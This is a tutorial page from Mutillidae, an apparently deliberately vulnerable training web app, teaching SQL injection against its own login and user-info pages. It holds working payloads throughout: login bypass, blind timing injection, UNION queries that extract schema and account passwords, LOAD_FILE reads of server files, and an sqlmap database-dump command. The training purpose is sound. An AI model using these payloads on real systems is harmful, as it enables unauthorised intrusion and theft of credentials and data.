<?php 
/*
 * @author: Jeremy Druin
*/ 
?>

<div>&nbsp;</div>
<table class="tutorial">
	<tr class="tutorial-title">
		<td>SQL Injection Tutorial</td>
	</tr>
	<tr>
		<td>
			<br/>
			<span class="report-header">General Steps</span>
			<br/><br/>
			<ol class="tutorial">
				<li>
					Determine if SQL injection exists
					<ul>
						<li>
							Try injecting characters reserved in databases to produce error messages
							<br/><br/>
							<span class="important-code">single-quote<br/>back-slash<br/>double-hyphen<br/>forward-slash<br/>period</span>
							<br/><br/> 
						</li>
						<li>If error message is produces, examine message for helpful errors, queries, database brand, columns, tables or other information.</li>
						<li>
							If no error message present, send valid data, "true" injections ("or 1=1") and "false" injections ("and 1=0"). Look for difference in the three responses
							<br/><br/>
							<span class="important-code">
								Technique: Blind SQL Injection - True and False Values<br/>
								Field: username<br/>
								True Value (Using Proxy): &#39; or 1=1 --<br/> 
								False Value (Using Proxy): &#39; and 1=0 --<br/>
							</span>
							<br/> 
						</li>
						<li>
							If no errors nor differences are produced, try timing attacks ("mysql sleep(), sql server waitfor(), oracle sleep()")
							<br/><br/>
							<span class="important-code">
								&#39; union Select null, null, null, sleep(5) -- 
							</span>
							<br/><br/>
						</li>
					</ul>
				</li>
				<li>
					Determine injection types that work
					<ul>
						<li>
							UNION statements
							<ul>
								<li>Determine number of columns in application query. Inject NULL columns until injected query works.</li>
								<li>Determine position of a varchar or equivalent column</li>
								<li>Use position of found column(s) to place injected columns. Use NULL for rest</li>
							</ul>
						</li>
						<li>Inline injection
							<ul>
								<li>Usually happens when ORDER BY or HAVING clause present in application query</li>
							</ul>
						</li>
						<li>Timing injection
							<br/><br/>
							<span class="important-code">
								Technique: Blind SQL Injection - Timing<br/>
								Page: login.php<br/>
								Field: username<br/>
								Value (Using Proxy): &#39; union Select null, case SUBSTRING(current_user(),1,1) when &#39;r&#39; THEN sleep(5) ELSE sleep(0) END, null, null --<br/> 
								Value (Using Direct Request): username=%27%20union%20Select%20null%2C%20case%20SUBSTRING%28current_user%28%29%2C1%2C1%29%20when%20%27r%27%20THEN%20sleep%285%29%20ELSE%20sleep%280%29%20END%2C%20null%2C%20null%20--%20&amp;password=&amp;login-php-submit-button=1
							</span>
							<br/><br/>
						</li>
					</ul>
				</li>
				<li>
					Attempt to determine database server brand
					<br/><br/>
					<span class="important-code">
						Technique: Direct Injection<br/>
						Page: user-info.php<br/>
						Field: username<br/>
						Value (Using Proxy): &#39; union select null,VERSION() AS username,null,null -- <br/> 
					</span>
					<br/>
				</li>
				<li>Formulate and test query</li>
				<li>Attempt to determine database name
					<br/><br/>
					<span class="important-code">
						Technique: Direct Injection<br/>
						Page: user-info.php<br/>
						Field: username<br/>
						Value (Using Proxy): &#39; union select null,DATABASE() AS username,null,null -- <br/> 
					</span>
					<br/>
				</li>
				<li>Attempt to determine schema name
					<br/><br/>
					<span class="important-code">
						Technique: Direct Injection<br/>
						Page: user-info.php<br/>
						Field: username<br/>
						Value (Using Proxy): &#39; union select null,table_schema AS username,null,null from INFORMATION_SCHEMA.TABLES-- <br/> 
					</span>
					<br/>
				</li>
				<li>
					Attempt to determine table(s) names
					<br/><br/>
					<span class="important-code">
						Technique: Direct Injection<br/>
						Page: user-info.php<br/>
						Field: username<br/>
						Value (Using Proxy): &#39; union select null,table_schema AS username,table_name AS password,null from INFORMATION_SCHEMA.TABLES-- <br/> 
					</span>
					<br/>
				</li>
				<li>Attempt to determine column(s) names
					<br/><br/>
					<span class="important-code">
						Technique: Direct Injection<br/>
						Recon: Extract table columns from database using a single field<br/>
						Page: user-info.php<br/>
						Field: Username<br/>
						Value: ' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS--<br/> 
					</span>
					<br/>
				</li>
				<li>
					Attempt to extract data
					<br/><br/>
					<span class="important-code">
						Technique: Direct Injection<br/>
						Page: user-info.php<br/>
						Field: Username<br/>
						Value: ' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- <br/>
					</span>
					<br/>
				</li>
				<li>
					Attempt to read files from server
					<br/><br/>
					<span class="important-code">
						Technique: Direct Injection<br/>
						Page: user-info.php<br/>
						Field: username<br/>
						Value (relative path):<br/>
						' union select null, LOAD_FILE('../README') AS username, null, null--<br/><br/> 
						Value (absolute path):<br/>
						' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts') AS username, null, null--<br/> 
						' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\inf\\cpu.inf') AS username, null, null--<br/> 
					</span>
					<br/>
				</li>
				<li>Attempt to upload files to server</li>				
				<li>
					Attempt to execute commands. This is easier on SQL Server 2000 and 2005. MySQL has limited
					system command abilities. SQL Server 2008 disables system commands by default and requires
					them to be enabled.
				</li>
				<li>
					Attempt to determine database computer name, IP address, username, version, etc.
					<br/><br/>
					<span class="important-code">
						MySQL Functions:<br/>
						VERSION() - MySQL server version<br/>
						USER() - Database user issuing query<br/>
						DATABASE() - Database on server against which query is running<br/>
					</span>
				</li>
				<li>
					Attempt to pivot to database server level. This will largely depend on either being able to execute
					system commands via the database server or upload files to the file system. Uploading files would allow
					web application pages to be uploaded which can contain system calls.
				</li>
			</ol>
			<br/>
			<span class="report-header">Reconnaissance</span>
			<br/><br/>
			Error messages can be excellent sources of information. 
			Developers are often naive about error messages and allow their apps to display 
			errors rather than log the errors privately or email them to support staff. Secure
			sites use custom error pages that display no error messages. 
			Finding an error message with respect to SQLi typically involves malforming the
			query on purpose. Special characters can get the job done. Single-quotes and 
			parenthesis often cause errors in SQL Server, Oracle and MySQL databases. Dont
			forget to use different encodings of each character to see if that makes a difference.
			For example, try URL encoding, hex, etc. Try those
			first, then move onto any character that is not alpha-numeric. 
			<br/><br/>
			Hint: Go to the documentation for ANSI-SQL, Oracle, SQL Server, and MySQL to see which characters 
			are reserved in those respective systems. (ANSI-SQL is the "common" SQL shared by all compliant databases.) 
			In particular, determine what are the comment symbols for the respective systems.
			<br/><br/>
			Try to find out what type of database is behind the application. Knowing
			if the database is Oracle, SQL Server, or MySQL can help a lot. Each has its own meta-tables,
			functions, system tables, system procedures, and vulnerabilities. If the database is SQL Server 
			or MySQL, investigate the INFORMATION_SCHEMA and understand the built-in functions/procedures. 
			They both implement this SQL-92 standard structure. Oracle uses non-standard 
			"Oracle Data Dictionary" views.	As of the date of this document, there is an awesome listing
			at <a href="http://ss64.com/orad/">http://ss64.com/orad/</a>. 
			<br/><br/>
			Sometimes the type of database can be infered by its behavior. For example, 
			SQL Server and MySQL both use "--" (double-hyphen) as the comment symbols; however,
			MySQL requires a space betwwen the comment symbol and the next character.
			<br /><br />
			This statement is a valid SQL injection against either SQL Server or MySQL:
			<br/>
<code>
' union select/**/name/**/FROM/**/INFORMATION_SCHEMA.TABLES-- 
</code>
			<br />
			MySQL can be identified by whether the injection requires a space on the end. Oracle
			and SQL Server do not care if there is a space at the end of the injection or not. But
			MySQL needs the space on the end. (At least when used with PHP.)
			<br />
<code>
' union select name FROM INFORMATION_SCHEMA.TABLES-- (&lt;-- space required here) 
</code>
			<br/>
			Determine the page capibilities. If the page displays database records, standard SQL
			injection is probably the better tool. If the page processes queries but does not display query output
			(i.e. - a login page), then blind SQLi may be the better tool.
			<br/><br/>
			Use the page normally and observe the behavior. For example, log into Mutillidae. Does Mutillidae
			display any information from the database because you log-in? (No)
			What happens when using page user-info.php?
			Does any data displaywhen using page user-info.php? (Yes)
			The login page is likely going to be a better candidate for blind SQL injection while user-info.php
			is likely a better candidate for direct SQL injection. 
			<br/><br/>
			<span class="report-header">Scanning</span>
			<br /><br />
			Get specifications on database software (Example Page: user-info.php)
			<br />
<code>
' union select null, database(), current_user(), version() -- 
</code>
			<br/>
			If the meta-tables are available, they can footprint the database structure making 
			the next steps much more productive.
			<br/><br/>
			Check the documentation for Oracle, MySQL, and SQL Server. Determine the meta-table structures, 
			table/view names, and column names.  If the database is SQL Server 
			or MySQL, investigate the INFORMATION_SCHEMA and understand the built-in functions/procedures. 
			They both implement this SQL-92 standard structure. Oracle uses non-standard 
			"Oracle Data Dictionary" views.	As of the date of this document, there is an awesome listing
			at <a href="http://ss64.com/orad/">http://ss64.com/orad/</a>.
			<br/><br/>
			Extract table names from database. (Example Page: user-info.php)
			<br />
<code>
' union select null,table_schema AS username,table_name AS password,null from INFORMATION_SCHEMA.TABLES-- 
</code>
		<br/>
		Extract table columns from database using a single field (Example Page: user-info.php)
		<br />
<code>
' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS-- 
</code>
		<br/>
		Extract views from database (Example Page: user-info.php)
		<br />
<code>
' union select null,concat_ws('.', COALESCE(table_schema,''), COALESCE(table_name,''), COALESCE(view_definition,'')) AS username,null,null from INFORMATION_SCHEMA.VIEWS-- 
</code>
		<br/>
		Extract triggers from database (Example Page: user-info.php)
		<br />
<code>
' union select null,concat_ws('.', trigger_schema, trigger_name) AS username,null,null from INFORMATION_SCHEMA.TRIGGERS-- 
</code>
		<br/>
		Extract routines/procs from database (Example Page: user-info.php)
		<br />
<code>
' union select null,concat_ws('.', routine_schema, routine_name, routine_type, routine_body) AS username,null,null from INFORMATION_SCHEMA.ROUTINES-- 
</code>
		<br/>
		Extract table columns from database (Example Page: user-info.php)
		<br />
<code>
' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS union select null,concat_ws('.', routine_schema, routine_name, routine_type, routine_body) AS username,null,null from INFORMATION_SCHEMA.ROUTINES union select null,concat_ws('.', table_schema, table_name, view_definition) AS username,null,null from INFORMATION_SCHEMA.VIEWS union select null,concat_ws('.', trigger_schema, trigger_name) AS username,null,null from INFORMATION_SCHEMA.TRIGGERS-- 
</code>
		<br/>
		Blind SQL injection does not depend on seeing any resulting records. Instead, page timing can be used.
		<br/><br/>
		Blind SQL Injection/Brute Forcing values (Example Page: login.php)
		<br />
<code>
' union Select null, case current_user() when 'root@localhost' THEN sleep(5) ELSE sleep(0) END, null, null -- 
</code>
		<br/>
		<span class="report-header">Gaining Access</span>
		<br/><br/>
		Extract passwords from user table (Example Page: user-info.php)
		<br />
<code>
' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- 
</code>
		<br/>
		Using SQL Injection (Page: login.php)
		<br />
<code>
' or 1=1 -- 
</code>
		<br/>
		Using SQLMAP to dump database (Page: view-someones-blog.php)
		<br />
<code>
python sqlmap.py --url=&quot;http://192.168.56.101/mutillidae/index.php?page=view-someones-blog.php&quot; --data=&quot;author=6C57C4B5-B341-4539-977B-7ACB9D42985A&amp;view-someones-blog-php-submit-button=View+Blog+Entries&quot; --level=1 --beep --dump
</code>
		</td>
	</tr>
</table>